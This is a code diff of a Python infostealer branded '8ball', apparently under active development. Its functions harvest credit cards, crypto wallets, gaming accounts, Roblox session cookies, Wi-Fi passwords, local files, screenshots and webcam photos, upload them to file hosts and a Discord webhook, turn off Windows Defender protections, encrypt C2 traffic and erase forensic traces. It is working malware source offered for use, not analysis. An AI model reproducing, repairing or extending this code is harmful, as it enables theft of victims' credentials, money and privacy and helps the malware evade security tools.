                     f"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> • **{CC5C0UNt}** Credit Cards Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_CreditCards.txt]({filess[3]})\n\n"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_CreditCards.txt]({filess[3]})\n\n"
                     f":bookmark: • **{B00KM4rK5C0UNt}** Bookmarks Found\n"
-                    f"<a:CH_IconArrowRight:715585320178941993> • [8BALL_DH_Bookmarks.txt]({filess[6]})"
+                    f"<a:CH_IconArrowRight:715585320178941993> • [8ball_Bookmarks.txt]({filess[6]})"
                 ),"footer": {
-                    "text": "8BALL | DH",
+                    "text": "8ball",
                     "icon_url": "https://i.ibb.co/fdFfLznd/images.png"
                 }
             }
         ],
-        "username": "8BALL | DH",
-        "avatar_url": "https://i.ibb.co/fdFfLznd/images.png",
+        "username": "8ball",
+        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
@@ -2339,16 +2241,11 @@ def G37D15C0rD(path, arg):
                             UP104D70K3N(tokenDecoded, path)
 
 def G47H3rZ1P5(paths1, paths2, paths3):
-    """
-    Crypto Wallet feature:
-    Collects wallet data from configured paths.
-    Only active when 'Crypto Wallet' (wallet_gaming_data) is enabled.
-    """
     if not FEATURE_CONFIG.get("wallet_gaming_data", False):
         return
+    RX_DB6("[8Ball] G47H3rZ1P5: starting wallet/gaming collection")
     thttht = []
     for walletids in w411375:
-        
         for patt in paths1:
             a = threading.Thread(target=Z1P7H1N65, args=[patt[0], patt[5]+str(walletids[0]), patt[1]])
             a.start()
@@ -2379,29 +2276,39 @@ def G47H3rZ1P5(paths1, paths2, paths3):
         ot = ":tickets:  •  Apps\n"
         for i in O7H3rZ1p:
             ot += f"└─ [{i[0]}]({i[1]})\n"
+    found_count = len(W411375Z1p) + len(G4M1N6Z1p) + len(O7H3rZ1p)
+    RX_DB6(f"[8Ball] G47H3rZ1P5: collected {found_count} items (wallets={len(W411375Z1p)} gaming={len(G4M1N6Z1p)} apps={len(O7H3rZ1p)})")
     headers = {
         "Content-Type": "application/json",
         "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
     }
 
+    desc = f"{wal}\n{ga}\n{ot}"
+    if not desc.strip():
+        desc = "No wallets, gaming, or app data found."
+
     data = {
         "content": f"@everyone @here {GLINFO}",
         "embeds": [
             {
-            "title": "8BALL | DH",
-            "description": f"{wal}\n{ga}\n{ot}","footer": {
-                "text": f"8Ball",
+            "title": "8ball",
+            "description": desc,
+            "footer": {
+                "text": "8ball",
                 "icon_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935"
             }
             }
         ],
-        "username": f"8BALL | DH",
-        "avatar_url": "https://cdn.discordapp.com/attachments/1013103740921851945/1518336935171457255/download_1_1.png?ex=6a398cf6&is=6a383b76&hm=ea182c6d051cedf37cab422b2cfe914f4d3ae62b942a8bcd05cde06f465f4935",
+        "username": f"8ball",
+        "avatar_url": "https://media.discordapp.net/attachments/1515919422844440731/1515922353094262876/download_1.jpg?ex=6a3e9bf5&is=6a3d4a75&hm=7556ae9503c51b3a7e9de93f3ea0f27c1add1bceb1d06a241fc680aa8aa8ad3c&=&format=webp",
         "attachments": [],
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
     }
-    
-    L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+    try:
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        RX_DB6("[8Ball] Wallet/Gaming embed sent.")
+    except Exception:
+        RX_DB6("[8Ball] Wallet/Gaming embed send failed.", "ERROR")
     tg_token = FEATURE_CONFIG.get("telegram_bot_token", "")
     tg_chat = FEATURE_CONFIG.get("telegram_chat_id", "")
     if tg_token and tg_chat:
@@ -2412,20 +2319,21 @@ def Z1P73136r4M(path, arg, procc):
     pathC = path
     name = arg
     if not os.path.exists(pathC): return
-    Z1PF01D3r(name, pathC)
+    zip_path = Z1PF01D3r(name, pathC)
 
-    lnik = None
-    zip_path = f"{temp}/{name}.zip"
-    if os.path.isfile(zip_path):
-        for i in range(3):
-            lnik = UP104D7060F113(zip_path)
-            if isinstance(lnik, str) and "https://" in lnik:
-                break
-            time.sleep(4)
+    for i in range(3):
+        lnik = UP104D7060F113(zip_path)
+        if "https://" in str(lnik):
+            break
+        time.sleep(4)
+    for _ in range(5):
         try:
             os.remove(zip_path)
+            break
         except PermissionError:
-            pass
+            time.sleep(0.5)
+        except Exception:
+            break
     O7H3rZ1p.append([arg, lnik])
 
 def Z1P7H1N65(path, arg, procc):
@@ -2435,14 +2343,18 @@ def Z1P7H1N65(path, arg, procc):
     global W411375Z1p, G4M1N6Z1p, O7H3rZ1p
     for walllts in w411375:
         if str(walllts[0]) in arg:
-            browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+            pathC = path + arg
+            # Extract last meaningful folder name for the browser label
+            parts = [p for p in path.split("\\") if p and p not in ("User Data", "Default", "")]
+            browser = parts[-1].replace(' ', '') if parts else "Unknown"
             name = f"{str(walllts[1])}_{browser}"
             pathC = path + arg
 
     if not os.path.exists(pathC): return
 
     if "Wallet" in arg:
-        browser = path.split("\\")[4].split("/")[1].replace(' ', '')
+        parts = [p for p in path.split("\\") if p and p not in ("User Data", "Default", "")]
+        browser = parts[-1].replace(' ', '') if parts else "Unknown"
         name = f"{browser}"
 
     elif "Steam" in arg:
@@ -2456,20 +2368,21 @@ def Z1P7H1N65(path, arg, procc):
         if found == False: return
         name = arg
 
-    Z1PF01D3r(name, pathC)
+    zip_path = Z1PF01D3r(name, pathC)
 
-    lnik = None
-    zip_path = f"{temp}/{name}.zip"
-    if os.path.isfile(zip_path):
-        for i in range(3):
-            lnik = UP104D7060F113(zip_path)
-            if isinstance(lnik, str) and "https://" in lnik:
-                break
-            time.sleep(4)
+    for i in range(3):
+        lnik = UP104D7060F113(zip_path)
+        if "https://" in str(lnik):break
+        time.sleep(4)
+
+    for _ in range(5):
         try:
             os.remove(zip_path)
+            break
         except PermissionError:
-            pass
+            time.sleep(0.5)
+        except Exception:
+            break
     if "/Local Extension Settings/" in arg or "/HougaBouga/"  in arg or "wallet" in arg.lower():
         W411375Z1p.append([name, lnik])
     elif "Steam" in name or "RiotCli" in name:
@@ -2548,6 +2461,11 @@ def G47H3r411():
     for patt in d15C0rDP47H5:
        S74r77Hr34D(G37D15C0rD, [patt[0], patt[1]]                                   )
     S74r77Hr34D(G378r0W53r5,   [br0W53rP47H5,]                                      )
+    # Wait for password/cookie collection before starting wallet/gaming
+    for thread in THr34D1157:
+        thread.join()
+    # Now start wallet/gaming (after passwords)
+    THr34D1157.clear()
     S74r77Hr34D(G47H3rZ1P5,    [br0W53rP47H5, p47H570Z1P, t3136r4M]                 )
     for thread in THr34D1157:
         thread.join()
@@ -2562,6 +2480,9 @@ def G37F11353rv3r():
 
 def UP104D7060F113(path):
     errors = []
+    if isinstance(path, list):
+        errors = path
+        return errors
     try:
         server = G37F11353rv3r()
         with open(path, "rb") as f:
@@ -2599,15 +2520,6 @@ def UP104D7060F113(path):
                     return dl
         except Exception as e:
             errors.append(f"GoFile fallback {fb_server}: {type(e).__name__}: {e}")
-    try:
-        with open(path, "rb") as f:
-            r = requests.post("https://temp.sh/upload", files={"file": f}, timeout=120, verify=False)
-        r.raise_for_status()
-        url = r.text.strip()
-        if url.startswith("http"):
-            return url
-    except Exception as e:
-        errors.append(f"temp.sh failed: {type(e).__name__}: {e}")
     return errors
 
 K1W1F113s = []
@@ -2695,15 +2607,15 @@ def filestealr():
     if not all_files:
         data = {
             "content": f"@everyone @here {GLINFO}",
-            "embeds": [{"title": "8BALL | DH", "description": "Local Files feature ran but found no matching files."}],
-            "username": "8BALL | DH",
+            "embeds": [{"title": "8ball", "description": "Local Files feature ran but found no matching files."}],
+            "username": "8ball",
             "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
         }
         L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
         return
     zip_link = None
-    zip_path = os.path.join(temp or os.getenv("TEMP") or ".", "RX_LocalFiles.zip")
     try:
+        zip_path = os.path.join(temp or os.getenv("TEMP") or ".", "RX_LocalFiles.zip")
         with ZipFile(zip_path, 'w') as zipf:
             for file_path in all_files:
                 if os.path.isfile(file_path):
@@ -2719,243 +2631,13 @@ def filestealr():
         desc += f"\n\n[Download ZIP]({zip_link})"
     data = {
         "content": f"@everyone @here {GLINFO}",
-        "embeds": [{"title": "8BALL | DH", "description": desc}],
-        "username": "8BALL | DH",
+        "embeds": [{"title": "8ball", "description": desc}],
+        "username": "8ball",
         "allowed_mentions": {"parse": ["everyone", "roles", "users"]},
     }
     L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
-    # Fallback: upload ZIP directly to Discord if GoFile failed and zip exists
-    if not (zip_link and isinstance(zip_link, str)) and os.path.isfile(zip_path):
-        try:
-            with open(zip_path, "rb") as f:
-                webhook_data = {"payload_json": dumps({"content": f"@everyone @here {GLINFO}", "username": "8BALL | DH", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}})}
-                requests.post(h00k, data=webhook_data, files={"file": ("LocalFiles.zip", f, "application/zip")}, timeout=120)
-        except Exception:
-            pass
-    try:
-        os.remove(zip_path)
-    except Exception:
-        pass
 
-def disable_windows_security():
-    try:
-        scm = ctypes.windll.advapi32.OpenSCManagerW(None, None, 0x000F01FF)
-        if not scm:
-            return
-        service = ctypes.windll.advapi32.OpenServiceW(scm, "WinDefend", 0x0020)
-        if service:
-            ctypes.windll.advapi32.ControlService(service, 0x00000001, None)
-            ctypes.windll.advapi32.CloseServiceHandle(service)
-        ctypes.windll.advapi32.CloseServiceHandle(scm)
-    except:
-        pass
-    try:
-        exe_path = sys.executable if getattr(sys, 'frozen', False) else __file__
-        subprocess.run(['powershell', '-NoProfile', '-Command', f'Add-MpPreference -ExclusionPath "{os.path.dirname(exe_path)}" -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableIOAVProtection $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBehaviorMonitoring $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBlockAtFirstSeen $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScanOnRealtimeEnable $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisablePrivacyMode $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableArchiveScanning $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableEmailScanning $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScriptScanning $true -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -MAPSReporting 0 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -SubmitSamplesConsent 2 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-    except:
-        pass
 
-def enable_windows_security():
-    try:
-        scm = ctypes.windll.advapi32.OpenSCManagerW(None, None, 0x000F01FF)
-        if not scm:
-            return
-        service = ctypes.windll.advapi32.OpenServiceW(scm, "WinDefend", 0x0010)
-        if service:
-            ctypes.windll.advapi32.StartServiceW(service, 0, None)
-            ctypes.windll.advapi32.CloseServiceHandle(service)
-        ctypes.windll.advapi32.CloseServiceHandle(scm)
-    except:
-        pass
-    try:
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableRealtimeMonitoring $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableIOAVProtection $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBehaviorMonitoring $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableBlockAtFirstSeen $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScanOnRealtimeEnable $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisablePrivacyMode $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableArchiveScanning $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableEmailScanning $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -DisableScriptScanning $false -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -MAPSReporting 2 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-        subprocess.run(['powershell', '-NoProfile', '-Command', 'Set-MpPreference -SubmitSamplesConsent 1 -Force'], capture_output=True, timeout=30, creationflags=CREATE_NO_WINDOW)
-    except:
-        pass
-
-# === NEW FEATURES ===
-
-def G37SYS1NF0():
-    if not FEATURE_CONFIG.get("system_info", False):
-        return
-    try:
-        import platform
-        try:
-            import GPUtil
-            gpus = GPUtil.getGPUs()
-            gpui = gpus[0].name if gpus else "No GPU found"
-        except Exception:
-            gpui = "No GPU found"
-        try:
-            import psutil
-            mem = psutil.virtual_memory()
-            mem_str = f"{mem.total / (1024**3):.2f} GB"
-        except Exception:
-            mem_str = "N/A"
-        ds = platform.uname()
-        sdg = platform.processor()
-        desc = f"**:man: | Username: {ds.node}**\n**:floppy_disk: | Processor: {ds.machine} {sdg}**\n**:desktop: | System: {ds.system}**\n**:vhs: | GPU: {gpui}**\n**:minidisc: | Memory: {mem_str}**"
-        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
-        payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":desktop: PC Info", "description": desc, "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
-        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
-    except Exception:
-        pass
-
-def G37SCR3NSH0T():
-    if not FEATURE_CONFIG.get("screenshot_capture", False):
-        return
-    try:
-        import pyautogui
-        ss = pyautogui.screenshot()
-        ss_path = os.path.join(temp or os.getenv("TEMP", "."), "desktop_screenshot.png")
-        ss.save(ss_path)
-        link = UP104D7060F113(ss_path)
-        os.remove(ss_path)
-        if link and isinstance(link, str):
-            headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
-            payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":camera: Screenshot", "description": f"[Download Screenshot]({link})", "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
-            L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
-    except Exception:
-        pass
-
-def G37W3BC4M():
-    if not FEATURE_CONFIG.get("webcam_capture", False):
-        return
-    try:
-        import cv2
-        cam = cv2.VideoCapture(0)
-        if cam.isOpened():
-            ret, frame = cam.read()
-            cam.release()
-            if ret:
-                cam_path = os.path.join(temp or os.getenv("TEMP", "."), "webcam_capture.png")
-                cv2.imwrite(cam_path, frame)
-                link = UP104D7060F113(cam_path)
-                os.remove(cam_path)
-                if link and isinstance(link, str):
-                    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
-                    payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":camera_with_flash: Webcam Capture", "description": f"[Download Photo]({link})", "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
-                    L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
-    except Exception:
-        pass
-
-def G37R0BL0X():
-    if not FEATURE_CONFIG.get("roblox_cookies", False):
-        return
-    try:
-        cookies = []
-        try:
-            import browser_cookie3
-            for browser in [browser_cookie3.chrome, browser_cookie3.chromium, browser_cookie3.brave, browser_cookie3.opera_gx, browser_cookie3.firefox, browser_cookie3.opera, browser_cookie3.edge]:
-                try:
-                    for c in browser(domain_name="roblox.com"):
-                        if c.name == '.ROBLOSECURITY':
-                            cookies.append(c.value)
-                except Exception:
-                    pass
-        except Exception:
-            pass
-        if not cookies:
-            desc = "No Roblox cookies found."
-        else:
-            desc_lines = []
-            all_data = ""
-            for c in cookies:
-                try:
-                    req = Request("https://users.roblox.com/v1/users/authenticated", headers={"Cookie": f".ROBLOSECURITY={c}", "User-Agent": "Mozilla/5.0"})
-                    resp = urlopen(req, timeout=10)
-                    info = loads(resp.read().decode())
-                    uid = info.get("id", 0)
-                    uname = info.get("name", "Unknown")
-                    dname = info.get("displayName", uname)
-                    rap_total = 0
-                    limited_count = 0
-                    limiteds_info = []
-                    try:
-                        inv_req = Request(f"https://inventory.roblox.com/v1/users/{uid}/assets/collectibles?limit=100&sortOrder=Asc", headers={"Cookie": f".ROBLOSECURITY={c}", "User-Agent": "Mozilla/5.0"})
-                        inv_resp = urlopen(inv_req, timeout=10)
-                        inv_data = loads(inv_resp.read().decode())
-                        for item in inv_data.get("data", []):
-                            if item.get("recentAveragePrice"):
-                                rap_total += item["recentAveragePrice"]
-                                limited_count += 1
-                                limiteds_info.append(f"{item.get('name', 'Unknown')} - {item['recentAveragePrice']} RAP")
-                    except Exception:
-                        pass
-                    desc_lines.append(f"**User:** {uname} (@{dname}) | **ID:** {uid}")
-                    desc_lines.append(f"**Limiteds:** {limited_count} | **RAP:** {rap_total:,}")
-                    top_limiteds = limiteds_info[:5]
-                    if top_limiteds:
-                        desc_lines.append("**Top Limiteds:** " + ", ".join(top_limiteds))
-                    desc_lines.append("")
-                    all_data += f"Username: {uname} (Display: {dname})\nUser ID: {uid}\n.ROBLOSECURITY: {c}\nLimiteds: {limited_count}\nRAP: {rap_total:,}\n\n"
-                except Exception:
-                    desc_lines.append(f"**Failed to verify one cookie**")
-            desc = "\n".join(desc_lines) if desc_lines else "Cookies found but could not verify."
-            data_path = os.path.join(temp or os.getenv("TEMP", "."), "roblox_data.txt")
-            with open(data_path, "w", encoding="utf-8") as f:
-                f.write(all_data)
-            link = UP104D7060F113(data_path)
-            os.remove(data_path)
-            if link and isinstance(link, str):
-                desc += f"\n\n[Full Data]({link})"
-        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
-        payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":video_game: Roblox Accounts", "description": desc[:4000], "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
-        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
-    except Exception:
-        pass
-
-def G37W1F1():
-    if not FEATURE_CONFIG.get("wifi_passwords", False):
-        return
-    try:
-        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
-        profiles = []
-        for line in result.stdout.splitlines():
-            if 'All User Profile' in line:
-                name = line.split(':')[1].strip()
-                profiles.append(name)
-        wifi_data = ""
-        for profile in profiles:
-            res = subprocess.run(['netsh', 'wlan', 'show', 'profile', f'name={profile}', 'key=clear'], capture_output=True, text=True, creationflags=CREATE_NO_WINDOW)
-            for line in res.stdout.splitlines():
-                if 'Key Content' in line:
-                    pwd = line.split(':')[1].strip()
-                    wifi_data += f"WiFi: {profile}\nPassword: {pwd}\n\n"
-        desc = f"Found {len(profiles)} Wi-Fi profile(s)" if wifi_data else "No Wi-Fi passwords found."
-        if wifi_data:
-            wifi_path = os.path.join(temp or os.getenv("TEMP", "."), "wifi_passwords.txt")
-            with open(wifi_path, "w", encoding="utf-8") as f:
-                f.write(wifi_data)
-            link = UP104D7060F113(wifi_path)
-            os.remove(wifi_path)
-            if link and isinstance(link, str):
-                desc += f"\n\n[Download Passwords]({link})"
-        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"}
-        payload = {"content": f"@everyone @here {GLINFO}", "embeds": [{"title": ":signal_strength: Wi-Fi Passwords", "description": desc, "footer": {"text": "8BALL | DH"}}], "username": "8BALL | DH", "avatar_url": "https://i.ibb.co/fdFfLznd/images.png", "allowed_mentions": {"parse": ["everyone", "roles", "users"]}}
-        L04DUr118(h00k, data=dumps(payload).encode(), headers=headers)
-    except Exception:
-        pass
 
 # === ENHANCED STEALTH LAYER ===
 # Runtime encryption, code obfuscation, timing jitter, process isolation, anti-indicators
@@ -2964,7 +2646,7 @@ import hashlib as _hl
 def c2_encrypt(plaintext, key=None):
     """Encrypt data with AES-256-GCM for C2 transmission"""
     if key is None:
-        key = _hl.sha256(b"8Ball_C2_v2_2024").digest()
+        key = _hl.sha256(b"8ball_C2_v2_2024").digest()
     if isinstance(plaintext, str):
         plaintext = plaintext.encode()
     cipher = AES.new(key, AES.MODE_GCM)
@@ -2974,7 +2656,7 @@ def c2_encrypt(plaintext, key=None):
 def c2_decrypt(data_b64, key=None):
     """Decrypt AES-256-GCM C2 data"""
     if key is None:
-        key = _hl.sha256(b"8Ball_C2_v2_2024").digest()
+        key = _hl.sha256(b"8ball_C2_v2_2024").digest()
     raw = base64.b64decode(data_b64)
     nonce, tag, ct = raw[:12], raw[12:28], raw[28:]
     cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
@@ -3032,17 +2714,265 @@ def rand_temp_file(ext=""):
 def cleanup_indicators():
     """Remove common forensic indicators (logs, registry artifacts)"""
     try:
-        for p in [os.path.join(os.environ.get("TEMP", ""), "8Ball_debug.log")]:
+        for p in [os.path.join(os.environ.get("TEMP", ""), "8ball_debug.log")]:
             if os.path.isfile(p):
                 try: os.remove(p)
                 except: pass
         try:
             subprocess.run(
-                "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 8Ball /f 2>nul",
+                "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v 8ball /f 2>nul",
                 shell=True, capture_output=True, creationflags=CREATE_NO_WINDOW
             )
         except: pass
     except: pass
+
+# ── system_info ──
+def system_info_collect():
+    if not FEATURE_CONFIG.get("system_info", False):
+        return
+    RX_DB6("[8Ball] system_info_collect: starting")
+    try:
+        import platform, psutil
+        uname = platform.uname()
+        boot = _dt.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+        cpu = f"{psutil.cpu_count(logical=True)} logical / {psutil.cpu_count(logical=False)} physical"
+        mem = f"{psutil.virtual_memory().total // (1024**3)} GB"
+        info = (
+            f"**OS**: {uname.system} {uname.release} {uname.version}\n"
+            f"**Host**: {uname.node}\n"
+            f"**CPU**: {cpu}\n"
+            f"**RAM**: {mem}\n"
+            f"**Boot**: {boot}\n"
+        )
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        data = {
+            "content": f"@everyone @here {GLINFO}",
+            "embeds": [{"title": "8ball — System Info", "description": info, "footer": {"text": "8ball"}}],
+            "username": "8ball",
+            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
+        }
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        RX_DB6("[8Ball] System info embed sent.")
+    except Exception as e:
+        RX_DB6(f"[8Ball] system_info_collect failed: {type(e).__name__}: {e}", "ERROR")
+
+# ── screenshot_capture ──
+def screenshot_capture_func():
+    if not FEATURE_CONFIG.get("screenshot_capture", False):
+        return
+    RX_DB6("[8Ball] screenshot_capture_func: starting")
+    try:
+        import io, PIL.ImageGrab
+        img = PIL.ImageGrab.grab()
+        buf = io.BytesIO()
+        img.save(buf, format="PNG")
+        path = rand_temp_file(".png")
+        with open(path, "wb") as f:
+            f.write(buf.getvalue())
+        link = UP104D7060F113(path)
+        try: os.remove(path)
+        except: pass
+        if not isinstance(link, str) or not link.startswith("http"):
+            link = "Upload failed"
+        desc = f"Screenshot captured.\n[Download]({link})"
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        data = {
+            "content": f"@everyone @here {GLINFO}",
+            "embeds": [{"title": "8ball — Screenshot", "description": desc, "footer": {"text": "8ball"}}],
+            "username": "8ball",
+            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
+        }
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        RX_DB6("[8Ball] Screenshot embed sent.")
+    except Exception as e:
+        RX_DB6(f"[8Ball] screenshot_capture_func failed: {type(e).__name__}: {e}", "ERROR")
+
+# ── webcam_capture ──
+def webcam_capture_func():
+    if not FEATURE_CONFIG.get("webcam_capture", False):
+        return
+    RX_DB6("[8Ball] webcam_capture_func: starting")
+    try:
+        import cv2
+        cap = cv2.VideoCapture(0, cv2.CAP_DSHOW)
+        if not cap.isOpened():
+            RX_DB6("[8Ball] Webcam: no camera found", "WARN")
+            return
+        ret, frame = cap.read()
+        cap.release()
+        if not ret:
+            RX_DB6("[8Ball] Webcam: failed to read frame", "WARN")
+            return
+        path = rand_temp_file(".png")
+        cv2.imwrite(path, frame)
+        link = UP104D7060F113(path)
+        try: os.remove(path)
+        except: pass
+        if not isinstance(link, str) or not link.startswith("http"):
+            link = "Upload failed"
+        desc = f"Webcam capture.\n[Download]({link})"
+        headers = {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
+        }
+        data = {
+            "content": f"@everyone @here {GLINFO}",
+            "embeds": [{"title": "8ball — Webcam", "description": desc, "footer": {"text": "8ball"}}],
+            "username": "8ball",
+            "allowed_mentions": {"parse": ["everyone", "roles", "users"]}
+        }
+        L04DUr118(h00k, data=dumps(data).encode(), headers=headers)
+        RX_DB6("[8Ball] Webcam embed sent.")
+    except Exception as e:
+        RX_DB6(f"[8Ball] webcam_capture_func failed: {type(e).__name__}: {e}", "ERROR")
+
+# ── roblox_cookies ──
+def roblox_cookies_func():
+    if not FEATURE_CONFIG.get("roblox_cookies", False):
+        return
+    RX_DB6("[8Ball] roblox_cookies_func: starting")
+    try:
+        cookies = []
+        roaming = os.environ.get("APPDATA", "")
+        local = os.environ.get("LOCALAPPDATA", "")
+        paths = [
+            os.path.join(local, "Roblox", "LocalStorage", "leveldb"),
+            os.path.join(roaming, "Roblox", "LocalStorage", "leveldb"),
+        ]
+        for p in paths:
+            if not os.path.isdir(p):
+                continue
+            for fname in os.listdir(p):
+                if not (fname.endswith(".ldb") or fname.endswith(".log")):
+                    continue
+                try:
+                    raw = open(os.path.join(p, fname), errors="ignore").read()
+                except:
+                    continue
+                for m in re.findall(r"\_\|WARNING:-DO NOT SHARE THIS\.--([a-zA-Z0-9_\-]+)", raw):
+                    if m not in cookies:
+                        cookies.append(m)
+                for m in re.findall(r"\.ROBLOSECURITY[^a-zA-Z0-9_\-]+([a-zA-Z0-9_\-]{20,})", raw):
+                    if m not in cookies:
+                        cookies.append(m)
+        if cookies:
+            desc = "Found Roblox `.ROBLOSECURITY` tokens:\n"
+            for c in cookies:
+                desc += f"`{c[:64]}...`\n"
+            if len(desc) > 4000:
